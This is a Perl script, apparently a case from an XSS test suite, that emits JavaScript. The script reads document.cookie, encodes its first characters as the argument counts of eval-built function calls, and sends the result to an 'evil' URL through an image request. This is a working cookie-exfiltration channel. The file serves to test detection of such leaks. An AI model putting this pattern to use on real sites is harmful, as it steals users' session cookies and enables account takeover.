#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Tests function-arguments";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">

		var reportdut = "";
		
		// gets the number of arguments and add it to the reporting
		// variable "reportdut"
		function argtest() {
		
			var args = arguments.length;
			reportdut += args+"_";			
			document.getElementById("testptag").innerHTML = document.getElementById("testptag").innerHTML + " args = " + args;
		}
		
		var mycookie = $evil;
		
		// the 9 first chars are translated into the position in the alphabet.
		// The position is translated into the arguments for a function
		// e.g. position = 3 --> argtest(1,1,1)
		// position = 5 --> argtest(1,1,1,1,1);
		for (i = 0; i < 9; i++) {
			var dut = mycookie.toLowerCase().charCodeAt(i) - "a".charCodeAt(0);
			var evalstr = "argtest(";
			for (j=0;j<dut;j++) {
				evalstr += "1";
				if (j != dut-1) evalstr +=",";
			}
			evalstr +=")";
			// call function with 
			eval(evalstr);
		}

		var url = "$imgevilurl?normal=" + reportdut;
		document.images[0].src = url;
		
    </script>
|;

require "xss_basic_footer.pl";
